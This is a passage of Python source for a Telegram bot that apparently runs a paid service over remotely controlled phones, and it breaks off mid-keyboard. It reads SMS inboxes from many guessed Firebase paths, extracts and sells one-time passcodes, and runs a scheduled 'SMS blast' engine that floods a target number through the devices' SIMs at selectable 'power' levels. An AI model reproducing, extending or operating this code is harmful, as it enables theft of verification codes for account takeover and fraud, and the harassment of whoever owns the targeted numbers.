    norm_sender = " ".join(str(sender or "").split()).lower()[:100]
    try:
        ts_int = int(ts or 0) // 60  # 60s bucket — same msg within 60s counts once
    except Exception:
        ts_int = 0
    blob = f"{norm_body}|{norm_sender}|{ts_int}".encode("utf-8", errors="ignore")
    return hashlib.sha256(blob).hexdigest()[:32]

def _normalize_phone(p):
    if not p:
        return ""
    s = str(p).strip()
    s = s.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    return s

# ============================================================
#  OTP — EXTRACTION (multi-strategy)
# ============================================================
def extract_otp(text):
    """
    Returns list of (code, score, context_snippet) sorted by confidence.
    Strategies:
      1. digit codes near OTP keyword
      2. alphanumeric codes (A1B2C3 style)
      3. spaced digit codes (1 2 3 4 5 6)
    Blocklist filters common years / trivials.
    """
    if not text:
        return []
    raw = str(text)[:_OTP_MAX_MSG_BODY]
    lower = raw.lower()
    has_kw = any(k in lower for k in _OTP_KEYWORDS)

    found = {}
    def _add(code, score, snippet):
        key = code.upper().replace(" ", "").replace("-", "")
        if key in _OTP_BLOCKLIST:
            return
        prev = found.get(key)
        if prev is None or score > prev[1]:
            found[key] = (code, score, snippet)

    # 1. digit codes
    for m in _OTP_RE_DIGITS.finditer(raw):
        code = m.group(1)
        if code in _OTP_BLOCKLIST:
            continue
        if len(set(code)) == 1:
            # 1111, 0000 etc are almost always not OTP
            continue
        score = 0
        if has_kw:
            score += 4
        L = len(code)
        if L == 6:
            score += 3
        elif L == 4:
            score += 2
        elif L == 5:
            score += 1
        elif L == 8:
            score += 1
        ctx_start = max(0, m.start() - 35)
        ctx = lower[ctx_start:m.start()]
        if any(k in ctx for k in _OTP_KEYWORDS):
            score += 3
        snippet = raw[max(0, m.start() - 20):min(len(raw), m.end() + 20)].replace("\n", " ")
        _add(code, score, snippet.strip())

    # 2. alphanumeric (but skip pure digits — already handled)
    for m in _OTP_RE_ALNUM.finditer(raw):
        code = m.group(1)
        if code.isdigit():
            continue
        if len(code) < 4 or len(code) > 12:
            continue
        # must contain at least one digit and one letter, OR be clearly mixed
        has_digit = any(c.isdigit() for c in code)
        has_alpha = any(c.isalpha() for c in code)
        if not (has_digit and has_alpha):
            continue
        score = 5 if has_kw else 3
        ctx_start = max(0, m.start() - 35)
        ctx = lower[ctx_start:m.start()]
        if any(k in ctx for k in _OTP_KEYWORDS):
            score += 3
        snippet = raw[max(0, m.start() - 20):min(len(raw), m.end() + 20)].replace("\n", " ")
        _add(code, score, snippet.strip())

    # 3. spaced digit codes
    for m in _OTP_RE_SPACED.finditer(raw):
        code = m.group(1)
        digits = code.replace(" ", "").replace("-", "")
        if not digits.isdigit():
            continue
        if len(digits) < 4 or len(digits) > 8:
            continue
        if len(set(digits)) == 1:
            continue
        score = 3 if has_kw else 1
        snippet = raw[max(0, m.start() - 20):min(len(raw), m.end() + 20)].replace("\n", " ")
        _add(digits, score, snippet.strip())

    ranked = sorted(found.values(), key=lambda x: -x[1])
    return ranked

# ============================================================
#  OTP — MESSAGE PATH RESOLVER
# ============================================================
def _msg_paths(dev_id):
    """All plausible paths for message list."""
    return [
        f"/clients/{dev_id}/messages.json",
        f"/clients/{dev_id}/sms.json",
        f"/clients/{dev_id}/inbox.json",
        f"/clients/{dev_id}/smsList.json",
        f"/clients/{dev_id}/receivedSms.json",
        f"/clients/{dev_id}/received.json",
        f"/clients/{dev_id}/webhookEvent/messages.json",
        f"/clients/{dev_id}/webhookEvent/sms.json",
        f"/messages/{dev_id}.json",
        f"/sms/{dev_id}.json",
        f"/inbox/{dev_id}.json",
        f"/devices/{dev_id}/messages.json",
        f"/devices/{dev_id}/sms.json",
        f"/received/{dev_id}.json",
    ]

def _get_ci(payload, *keys):
    """Case-insensitive first matching key."""
    if not isinstance(payload, dict):
        return None
    kls = [k.lower() for k in keys]
    for k, v in payload.items():
        if k.lower() in kls:
            return v
    return None

# ============================================================
#  OTP — PAYLOAD PARSER
# ============================================================
def parse_sms_payload(msg_id, payload):
    """Extract body, sender, ts from a raw message payload."""
    if not isinstance(payload, dict):
        return None
    body = _get_ci(
        payload,
        "body", "message", "text", "msg", "content", "sms", "smsBody",
        "bodyText", "MessageBody", "Body", "Message", "Text",
    )
    sender = _get_ci(
        payload,
        "address", "sender", "from", "originator", "phone", "phoneNumber",
        "senderAddress", "From", "Sender", "Address", "origin",
    )
    ts = _get_ci(
        payload,
        "date", "timestamp", "time", "receivedAt", "createdAt",
        "receivedDate", "dateTime", "Date", "Timestamp", "Time",
    )
    try:
        ts = int(ts) if ts is not None else 0
    except Exception:
        ts = 0

    # Handle ms vs s
    if ts > 10_000_000_000:
        ts = ts // 1000

    # Sanity: reject future (beyond 1h) or absurdly old (before 2015)
    current = now_ts()
    if ts > current + 3600:
        ts = current
    if ts < 1_420_000_000:
        ts = 0

    if not body:
        return None
    return {
        "id": str(msg_id),
        "body": str(body),
        "sender": str(sender) if sender else "Unknown",
        "ts": ts or now_ts(),
    }

# ============================================================
#  OTP — READ MESSAGES FROM DEVICE (multi-path + timeout)
# ============================================================
async def fb_read_messages(fb_url, dev_id, per_path_timeout=4):
    """
    Try all paths, dedupe by body-hash, return dict list.
    Each item: { msg_id, body, sender, ts, hash }
    """
    all_msgs = []
    seen_hashes = set()

    for p in _msg_paths(dev_id):
        data = await fb_get_with_timeout(fb_url, p, timeout_sec=per_path_timeout)
        if not data:
            continue

        items = []
        if isinstance(data, dict):
            keys_lower = {k.lower() for k in data.keys()}
            looks_like_msg = any(
                k in keys_lower for k in
                ("body", "message", "text", "msg", "content", "address", "sender")
            )
            if looks_like_msg:
                items.append((str(int(time.time() * 1000)), data))
            else:
                for k, v in data.items():
                    if isinstance(v, dict):
                        items.append((str(k), v))
        elif isinstance(data, list):
            for i, v in enumerate(data):
                if isinstance(v, dict):
                    items.append((str(i), v))

        for mid, pl in items:
            parsed = parse_sms_payload(mid, pl)
            if not parsed:
                continue
            h = _body_hash(parsed["body"], parsed["sender"], parsed["ts"])
            if h in seen_hashes:
                continue
            seen_hashes.add(h)
            parsed["hash"] = h
            all_msgs.append(parsed)

    all_msgs.sort(key=lambda x: -x["ts"])
    return all_msgs

# ============================================================
#  OTP — COLLECT ALL (with OTP extraction)
# ============================================================
async def collect_all_messages(device, limit=_OTP_MAX_SCAN):
    """Full message dump with OTP extraction, newest first."""
    fb_url = device["fb_url"]
    dev_id = device["dev_id"]

    raw = await fb_read_messages(fb_url, dev_id)
    out = []
    for m in raw[:limit]:
        otps = extract_otp(m["body"])
        out.append({
            "msg_id": m["id"],
            "hash": m["hash"],
            "sender": m["sender"],
            "body": m["body"],
            "ts": m["ts"],
            "otps": [o[0] for o in otps[:3]],
            "has_otp": len(otps) > 0,
            "score": otps[0][1] if otps else 0,
        })
    return out

# ============================================================
#  OTP — COLLECT FRESH ONLY
# ============================================================
async def collect_fresh_otps(device, fresh_secs=None, limit=_OTP_MAX_SCAN):
    """Return (fresh_otps, all_msgs) — fresh = ts >= now - fresh_secs."""
    if fresh_secs is None:
        d = load()
        fresh_secs = get_otp_fresh_window(d)
    cutoff = now_ts() - int(fresh_secs)

    all_msgs = await collect_all_messages(device, limit=limit)
    fresh = [m for m in all_msgs if m["has_otp"] and m["ts"] >= cutoff]
    return fresh, all_msgs

# ============================================================
#  OTP — NEW SINCE TIMESTAMP (for live mode)
# ============================================================
async def collect_new_otps(device, since_ts, limit=_OTP_MAX_SCAN):
    """Return only OTPs with ts >= since_ts."""
    all_msgs = await collect_all_messages(device, limit=limit)
    new = [m for m in all_msgs if m["has_otp"] and m["ts"] >= since_ts]
    return new

# ============================================================
#  OTP — REFUND LEDGER
# ============================================================
def otp_reserve(uid, cost, d, device_id, reason="otp-fetch"):
    """Reserve cost for an OTP fetch. Actual deduct happens on success."""
    k = str(uid)
    pending = d.setdefault("otp_pending", {}).setdefault(k, [])
    entry = {
        "cost": int(cost),
        "device_id": device_id,
        "ts": now_ts(),
        "reason": reason,
        "reserved": True,
    }
    pending.append(entry)
    if len(pending) > 20:
        d["otp_pending"][k] = pending[-20:]
    return entry

def otp_commit(uid, d, entry):
    """Commit a reservation: deduct coins, remove pending."""
    k = str(uid)
    if not entry or not entry.get("reserved"):
        return True
    cost = int(entry.get("cost", 0))
    if cost <= 0:
        _remove_pending(uid, d, entry)
        return True
    if deduct_coins(uid, cost, d, entry.get("reason", "otp")):
        u = d.get("users", {}).get(k, {})
        u["otp_uses"] = u.get("otp_uses", 0) + 1
        d.setdefault("stats", {})["otp_fetches"] = d.get("stats", {}).get("otp_fetches", 0) + 1
        _remove_pending(uid, d, entry)
        return True
    _remove_pending(uid, d, entry)
    return False

def otp_refund(uid, d, entry):
    """Cancel a reservation (no coins were ever deducted) — just remove pending."""
    _remove_pending(uid, d, entry)
    d.setdefault("stats", {})["otp_refunds"] = d.get("stats", {}).get("otp_refunds", 0) + 1

def _remove_pending(uid, d, entry):
    k = str(uid)
    pending = d.get("otp_pending", {}).get(k, [])
    entry_id = id(entry)
    new = [e for e in pending if id(e) != entry_id]
    if new:
        d["otp_pending"][k] = new
    else:
        d.get("otp_pending", {}).pop(k, None)

# ============================================================
#  OTP — HISTORY SAVE
# ============================================================
def record_otp_history(d, uid, otp, sender, device, cost_paid):
    k = str(uid)
    hist = d.setdefault("otp_history", {}).setdefault(k, [])
    hist.append({
        "otp": str(otp)[:16],
        "sender": str(sender)[:64],
        "device_name": str(device.get("dev_name", ""))[:32],
        "device_phone": str(device.get("phone") or ""),
        "fb_id": device.get("fb_id", ""),
        "timestamp": now_ts(),
        "cost": int(cost_paid),
    })
    if len(hist) > 300:
        d["otp_history"][k] = hist[-300:]

# ============================================================
#  OTP — FORMAT MESSAGE LIST FOR DISPLAY
# ============================================================
def format_otp_list(otps, header, mode_label="", limit=15):
    lines = [f"{em(EMOJI_OTP, '🔐')} <b>{header}</b> {mode_label}\n"]
    shown = 0
    for i, o in enumerate(otps[:limit], 1):
        codes = ", ".join(o.get("otps", [])) if o.get("otps") else "?"
        body = esc(str(o.get("body", ""))[:180])
        age = fmt_age(o.get("ts", 0))
        ts_str = fmt_time_short(o.get("ts", 0))
        lines.append(
            f"{i}. 🔐 <code>{codes}</code>\n"
            f"   📤 <b>{esc(str(o.get('sender', '?'))[:40])}</b>\n"
            f"   🕐 {ts_str} ({age})\n"
            f"   💬 <i>{body}</i>\n"
        )
        shown += 1
    if len(otps) > shown:
        lines.append(f"<i>...and {len(otps) - shown} more</i>")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    return txt

# ============================================================
#  OTP — STATS SNAPSHOT (for panel)
# ============================================================
def otp_stats_snapshot(d):
    stats = d.get("stats", {})
    return {
        "fetches": int(stats.get("otp_fetches", 0)),
        "refunds": int(stats.get("otp_refunds", 0)),
        "pending_users": len(d.get("otp_pending", {})),
        "cost": get_otp_cost(d),
        "fresh_window": get_otp_fresh_window(d) // 60,
    }

# ═══════════════════════════════════════════════════════════
#  END OF PART 3 — paste PART 4 after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 4 — UNIFIED FIREBASE ADD + BLAST ENGINE + SCHEDULER
# ============================================================

# ============================================================
#  FIREBASE ADD — UNIFIED HANDLER (text + files + docs)
# ============================================================
#  Owner flow:
#    1. tap "add firebase" → state S.add_firebase
#    2. can paste:
#       - one URL
#       - "Label | URL"
#       - many URLs (one per line)
#       - upload file (any type, up to 5MB each, up to 20 in 3s window)
#       - mix text + files
#    3. bot collects for 3s, then processes all → sends report
# ============================================================

async def _firebase_add_process(bot, uid, chat_id, entries):
    """Shared process + report for both text and file paths."""
    try:
        result = await process_firebase_import(bot, uid, entries)
    except Exception as e:
        log.error(f"[FB ADD] process failed: {e}", exc_info=True)
        try:
            await bot.send_message(
                chat_id,
                f"❌ <b>Import failed</b>\n<code>{esc(str(e)[:200])}</code>",
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    report = build_import_report(result)
    d = load()
    log_audit(d, "fb_import", uid,
              f"added={len(result['added'])} failed={len(result['failed'])} skipped={len(result['skipped'])}")
    save()

    try:
        await bot.send_message(
            chat_id, report,
            reply_markup=kb(
                (sc("view firebases"), "owner:fb:menu:0"),
                (sc("back"), "owner:home"),
            ),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as e:
        log.warning(f"[FB ADD] report send failed: {e}")

def _parse_manual_fb_entry(text):
    """
    Parse owner's manual entry line into (label, url) or None.
    Supports:
      URL
      Label | URL
      Label, URL
    """
    text = (text or "").strip()
    if not text:
        return None
    urls = extract_urls(text)
    if not urls:
        return None
    label = ""
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()[:30]
    elif "," in text:
        parts = text.split(",", 1)
        head = parts[0].strip()
        if not head.startswith("http"):
            label = head[:30]
    return {"label": label, "urls": urls, "raw": text}

# ============================================================
#  BLAST ENGINE
# ============================================================
class UserSession:
    __slots__ = ("uid", "cancelled", "sent", "failed", "task",
                 "start_time", "lock", "number", "blast_data")
    def __init__(self, uid):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.blast_data = None

def _get_blast_sem():
    """Lazy-create the global blast semaphore (created in part 10)."""
    global GLOBAL_BLAST_SEM
    if GLOBAL_BLAST_SEM is None:
        GLOBAL_BLAST_SEM = asyncio.Semaphore(_GLOBAL_BLAST_LIMIT)
    return GLOBAL_BLAST_SEM

async def blast(bot, msg, uid, number, message, count, devices, speed=SPEED_DEFAULT):
    """Entry point. Pre-checks credits, count, devices. Runs in global sem."""
    if not devices:
        try:
            await msg.answer(
                f"{em(EMOJI_WARNING, '😴')} No APIs online!",
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    pm = CURRENT_POWER_MODE
    cap = len(devices) * pm
    if count > cap:
        try:
            await msg.answer(
                f"{em(EMOJI_WARNING, '⚠️')} Max <b>{cap}</b>. Auto-adjust.",
                parse_mode="HTML",
            )
        except Exception:
            pass
        count = cap

    if count <= 0:
        try:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} Invalid count.",
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    d = load()
    is_regular = not is_admin(uid, d) and not is_owner(uid, d)

    # Pre-check credits for regular users — block before starting
    if is_regular:
        credits = get_user_credits(uid, d)
        if credits <= 0:
            try:
                await msg.answer(
                    f"{em(EMOJI_CROSS, '❌')} <b>No credits.</b> Buy first.",
                    reply_markup=kb(
                        (sc("buy"), "user:pricing"),
                        (sc("home"), "user:home"),
                    ),
                    parse_mode="HTML",
                )
            except Exception:
                pass
            return
        if count > credits:
            count = credits

    # User limit
    if is_regular:
        ulim = get_user_send_limit(uid, d)
        if ulim is not None:
            if ulim <= 0:
                try:
                    await msg.answer(
                        f"{em(EMOJI_CROSS, '🚫')} Send blocked.",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass
                return
            if count > ulim:
                count = ulim

    # Maintenance check
    allowed, reason = check_service(uid, d, "send_sms")
    if not allowed:
        try:
            await msg.answer(
                f"🔧 {esc(reason)}",
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    async with _get_blast_sem():
        await _run_blast(bot, msg, uid, number, message, count, devices, speed, pm)

async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old = USER_SESSIONS[uid]
            if old.task and not old.task.done():
                try:
                    await msg.answer(
                        f"{em(EMOJI_WARNING, '⚠️')} Blast already running!",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        session.number = number
        session.blast_data = load()
        USER_SESSIONS[uid] = session

    d = load()
    is_regular = not is_admin(uid, d) and not is_owner(uid, d)
    init_credits = get_user_credits(uid, d) if is_regular else None
    slabel = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        pmsg = await msg.answer(
            progress_text(0, 0, count, init_credits, slabel),
            reply_markup=stop_kb(),
            parse_mode="HTML",
        )
    except Exception:
        async with SESSIONS_LOCK:
            USER_SESSIONS.pop(uid, None)
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_delta = {}
    last_upd = time.time()
    start = time.time()
    edit_lock = asyncio.Lock()

    sem = asyncio.Semaphore(min(len(devices), _SEND_CONCURRENCY))
    device_cooldown = {}  # device_id -> last_send_ts

    async def upd_progress(force=False):
        nonlocal last_upd
        async with edit_lock:
            now = time.time()
            if not force and now - last_upd < _PROGRESS_UPDATE_INTERVAL:
                return
            last_upd = now
            try:
                live = get_user_credits(uid, load()) if is_regular else None
                await pmsg.edit_text(
                    progress_text(sent_ok, sent_fail, count, live, slabel),
                    reply_markup=stop_kb() if not session.cancelled else None,
                    parse_mode="HTML",
                )
            except TelegramRetryAfter as e:
                await asyncio.sleep(e.retry_after + 1)
            except Exception:
                pass

    async def send_one(device, pass_num):
        nonlocal sent_ok, sent_fail, msgs_left
        async with sem:
            async with session.lock:
                if session.cancelled or msgs_left <= 0:
                    return
                msgs_left -= 1

            fb_id = device["fb_id"]
            fb_url = device["fb_url"]
            dev_id = device["dev_id"]
            sims = device.get("sims", [])
            sim_slots = []
            if isinstance(sims, list):
                for s in sims:
                    if isinstance(s, dict):
                        try:
                            sim_slots.append(int(s.get("simSlotIndex", 0)))
                        except Exception:
                            sim_slots.append(0)
            if isinstance(sims, dict):
                for s in sims.values():
                    if isinstance(s, dict):
                        try:
                            sim_slots.append(int(s.get("simSlotIndex", 0)))
                        except Exception:
                            sim_slots.append(0)
            if not sim_slots:
                sim_slots = [0]

            # per-device cooldown — 0.25s minimum between sends from same dev
            last = device_cooldown.get(dev_id, 0)
            gap = time.time() - last
            if gap < 0.25:
                try:
                    await asyncio.sleep(0.25 - gap)
                except asyncio.CancelledError:
                    raise
            device_cooldown[dev_id] = time.time()

            sim = sim_slots[pass_num % len(sim_slots)]
            ok = False
            try:
                ok = await sms_via_device(fb_url, dev_id, sim, number, message)
            except asyncio.CancelledError:
                raise
            except Exception:
                pass

            async with session.lock:
                if ok:
                    sent_ok += 1
                    if is_regular:
                        d_live = session.blast_data
                        if deduct_credits(uid, 1, d_live, "blast"):
                            d_live["stats"]["total_sent"] = d_live["stats"].get("total_sent", 0) + 1
                            k = str(uid)
                            if k in d_live["users"]:
                                d_live["users"][k]["uses"] = d_live["users"][k].get("uses", 0) + 1
                            d_live.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                "number": number,
                                "message": str(message)[:100],
                                "timestamp": now_ts(),
                                "status": "sent",
                            })
                else:
                    sent_fail += 1
                if fb_id not in api_delta:
                    api_delta[fb_id] = {"sent": 0, "failed": 0}
                api_delta[fb_id]["sent" if ok else "failed"] += 1

            await upd_progress()

    async def do_send():
        try:
            for pass_num in range(pm):
                if msgs_left <= 0:
                    break
                async with session.lock:
                    if session.cancelled:
                        break
                tasks = []
                for device in devices:
                    async with session.lock:
                        if msgs_left <= 0 or session.cancelled:
                            break
                    tasks.append(send_one(device, pass_num))
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                if speed > 0:
                    await asyncio.sleep(speed)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.error(f"[BLAST LOOP] uid={uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    try:
        await task
    except asyncio.CancelledError:
        session.cancelled = True
    except Exception:
        pass
    finally:
        try:
            if not is_regular:
                df = session.blast_data if session.blast_data else load()
                df["stats"]["total_sent"] = df["stats"].get("total_sent", 0) + sent_ok
                df["stats"]["total_failed"] = df["stats"].get("total_failed", 0) + sent_fail
                for fid, dl in api_delta.items():
                    df["stats"].setdefault("api_usage", {}).setdefault(fid, {"sent": 0, "failed": 0})
                    df["stats"]["api_usage"][fid]["sent"] += dl["sent"]
                    df["stats"]["api_usage"][fid]["failed"] += dl["failed"]
                k = str(uid)
                if k in df["users"]:
                    df["users"][k]["uses"] = df["users"][k].get("uses", 0) + sent_ok
                df.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                    "number": number,
                    "message": str(message)[:100],
                    "timestamp": now_ts(),
                    "status": "completed" if not session.cancelled else "stopped",
                })
                save(df)
            else:
                df = session.blast_data if session.blast_data else load()
                df["stats"]["total_failed"] = df["stats"].get("total_failed", 0) + sent_fail
                for fid, dl in api_delta.items():
                    df["stats"].setdefault("api_usage", {}).setdefault(fid, {"sent": 0, "failed": 0})
                    df["stats"]["api_usage"][fid]["failed"] += dl["failed"]
                save(df)
        except Exception:
            pass
        finally:
            async with SESSIONS_LOCK:
                USER_SESSIONS.pop(uid, None)

    was_cancel = session.cancelled
    await upd_progress(force=True)
    dur = max(1, int(time.time() - start))
    rate = sent_ok / dur
    log_activity(load(), "sms_blast", uid, f"sent={sent_ok} failed={sent_fail}")

    try:
        ci = await bot.get_chat(uid)
        u_name = ci.full_name or "Unknown"
        u_uname = f"@{ci.username}" if ci.username else "None"
    except Exception:
        u_name = load().get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "None"

    _spawn(send_log(bot, (
        f"🚀 <b>SMS BLAST</b>\n\n"
        f"👤 {esc(u_name)}\n🆔 <code>{uid}</code>\n🌐 {esc(u_uname)}\n"
        f"📞 <code>{esc(number)}</code>\n"
        f"💬 <code>{esc(str(message)[:100])}</code>\n"
        f"✅ {sent_ok} | ❌ {sent_fail} | 📊 {count}\n"
        f"🔢 {pm}x | ⚡ {rate:.1f}/s | ⏱ {fmt_duration(dur)}\n"
        f"🛑 {'STOPPED' if was_cancel else 'COMPLETED'}"
    )))

    icon = (
        em(EMOJI_CHECK, "✅") if sent_fail == 0 and sent_ok > 0
        else em(EMOJI_WARNING, "⚠️") if sent_ok > 0
        else em(EMOJI_CROSS, "❌")
    )
    ctxt = ""
    if is_regular:
        ctxt = f"\n💰 Used: <b>{sent_ok}</b> | Left: <b>{get_user_credits(uid, load())}</b>"
    stxt = f"\n🛑 <b>Stopped!</b>" if was_cancel else ""

    if is_owner(uid, load()):
        back = [btn("owner panel", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    elif is_admin(uid, load()):
        back = [btn("admin panel", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
    else:
        back = [
            btn("send another", "user:send", EMOJI_ROCKET, "📤", style="success"),
            btn("home", "user:home", EMOJI_ROCKET, "🏠", style="primary"),
        ]

    try:
        await pmsg.edit_text(
            f"{icon} <b>Blast Result</b>{stxt}\n\n"
            f"📞 <code>{esc(mask_number(number))}</code>\n"
            f"💬 <code>{esc(str(message)[:50])}</code>\n"
            f"✅ Sent: <b>{sent_ok}</b>\n"
            f"❌ Failed: <b>{sent_fail}</b>\n"
            f"🔢 Power: <b>{pm}x</b>\n"
            f"⚡ Rate: <b>{rate:.1f}/s</b>\n"
            f"⏱ {fmt_duration(dur)}{ctxt}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back]),
            parse_mode="HTML",
        )
    except Exception:
        pass

# ============================================================
#  SCHEDULER LOOP
# ============================================================
async def scheduler_loop(bot):
    while True:
        try:
            await asyncio.sleep(_SCHED_TICK)
            now = now_ts()
            d = load()
            scheds = d.get("scheduled", [])
            if not scheds:
                continue

            remaining = []
            for item in scheds:
                try:
                    if not item.get("active", True):
                        continue
                    when = int(item.get("when", 0))
                    if when > now:
                        remaining.append(item)
                        continue

                    uid = int(item.get("uid", 0))
                    number = item.get("number", "")
                    message = item.get("message", "")
                    count = int(item.get("count", 0))
                    speed = float(item.get("speed", SPEED_DEFAULT))
                    repeat_min = int(item.get("repeat_minutes", 0))

                    # credits check before firing
                    user_d = load()
                    is_regular = not is_admin(uid, user_d) and not is_owner(uid, user_d)
                    if is_regular:
                        credits = get_user_credits(uid, user_d)
                        if credits <= 0:
                            log.warning(f"[SCHED] uid={uid} no credits, skipping")
                            continue
                        count = min(count, credits)

                    # maintenance
                    allowed, _ = check_service(uid, user_d, "send_sms")
                    if not allowed:
                        log.info(f"[SCHED] uid={uid} service down, skipping")
                        continue

                    if repeat_min > 0:
                        item["when"] = now + repeat_min * 60
                        remaining.append(item)

                    _spawn(_scheduled_blast_fire(bot, uid, number, message, count, speed))
                except Exception as e:
                    log.warning(f"[SCHED] item error: {e}")
            d["scheduled"] = remaining
            save(d)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.warning(f"[SCHED] loop error: {e}")

async def _scheduled_blast_fire(bot, uid, number, message, count, speed):
    try:
        devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
        if not devices:
            try:
                devices = await scan_all(load())
            except Exception:
                devices = []
        if not devices:
            return

        class _FakeMsg:
            async def answer(self, *a, **k):
                try:
                    return await bot.send_message(uid, *a, **k)
                except Exception:
                    return None
            chat = type("C", (), {"id": uid})()

        await blast(bot, _FakeMsg(), uid, number, message, count, devices, speed)
    except Exception as e:
        log.warning(f"[SCHED] fire: {e}")

# ============================================================
#  PROGRESS TEXT (helper for blast)
# ============================================================
def progress_text(sent, failed, total, credits=None, speed_label="⚡", extra=""):
    bar = progress_bar(sent + failed, total)
    pct = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('blasting sms')}</b>\n",
        f"<code>{bar}</code> <b>{pct}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ   : <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ : <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴛᴏᴛᴀʟ  : <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ  : <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs: <b>{credits}</b>")
    if extra:
        lines.append(extra)
    lines.append(f"\n<i>🛑 sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ɴᴇᴇᴄʜᴇ.</i>")
    return "\n".join(lines)

# ============================================================
#  STOP KEYBOARD
# ============================================================
def stop_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("stop sending", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])

# ═══════════════════════════════════════════════════════════
#  END OF PART 4 — paste PART 5 after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 5 — KEYBOARDS + PANELS (all)
# ============================================================

# ============================================================
#  SPEED KEYBOARD
# ============================================================
def speed_kb(prefix):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("fast", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="danger"),
            btn("medium", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("slow", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="success"),
        ],
        [btn("cancel", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")],
    ])

# ============================================================
#  POWER ROW
# ============================================================
def power_row():
    return [
        btn("2x", "owner:set_power:2", EMOJI_ROCKET, "🚀",
            style="success" if CURRENT_POWER_MODE == 2 else "primary"),
        btn("3x", "owner:set_power:3", EMOJI_FIRE, "🔥",
            style="success" if CURRENT_POWER_MODE == 3 else "primary"),
        btn("4x", "owner:set_power:4", EMOJI_FIRE, "💥",
            style="success" if CURRENT_POWER_MODE == 4 else "primary"),
        btn("5x", "owner:set_power:5", EMOJI_FIRE, "💣",
            style="success" if CURRENT_POWER_MODE == 5 else "primary"),
        btn("10x", "owner:set_power:10", EMOJI_FIRE, "☠️",
            style="danger" if CURRENT_POWER_MODE == 10 else "primary"),
    ]

# ============================================================
#  OWNER PANEL KEYBOARD
# ============================================================
def owner_kb(d):
    maint = d.get("settings", {}).get("maintenance", False)
    maint_lbl = f"🔧 {sc('maintenance: ON')}" if maint else f"🔧 {sc('maintenance: OFF')}"
    svc_down = sum(1 for k, v in d.get("settings", {}).get("maintenance_services", {}).items() if v)
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("send sms", "user:send", EMOJI_ROCKET, "📤", style="success"),
            btn("get otp", "user:otp:menu", EMOJI_OTP, "🔐", style="primary"),
        ],
        [
            btn("manage firebase", "owner:fb:menu:0", EMOJI_FIRE, "🔥", style="primary"),
            btn("manage videos", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"),
        ],
        [
            btn("manage users", "owner:users:list", EMOJI_USER, "👥", style="primary"),
            btn("search user", "owner:users:search", EMOJI_SEARCH, "🔎", style="primary"),
        ],
        [
            btn("add credits", "owner:credits:add_pick", EMOJI_MONEY, "💰", style="success"),
            btn("add coins", "owner:coins:add_pick", EMOJI_COIN, "🪙", style="success"),
        ],
        [
            btn("deduct credits", "owner:credits:deduct_pick", EMOJI_MINUS, "💸", style="danger"),
            btn("deduct coins", "owner:coins:deduct_pick", EMOJI_MINUS, "🪙", style="danger"),
        ],
        [
            btn("add to all", "owner:add_all_credits", EMOJI_PLUS, "➕", style="primary"),
            btn("deduct all", "owner:deduct_all_credits", EMOJI_MINUS, "➖", style="danger"),
        ],
        [
            btn("manage owners", "owner:owners:menu", EMOJI_CROWN, "👑", style="primary"),
            btn("manage admins", "owner:admins:menu", EMOJI_SHIELD, "🛡", style="primary"),
        ],
        [
            btn("ban user", "owner:ban", EMOJI_CROSS, "🚫", style="danger"),
            btn("unban user", "owner:unban:menu", EMOJI_CHECK, "✅", style="success"),
        ],
        [
            btn("broadcast", "owner:broadcast", EMOJI_BELL, "📢", style="primary"),
            btn("api stats", "owner:stats", EMOJI_CHART, "📊", style="primary"),
        ],
        [
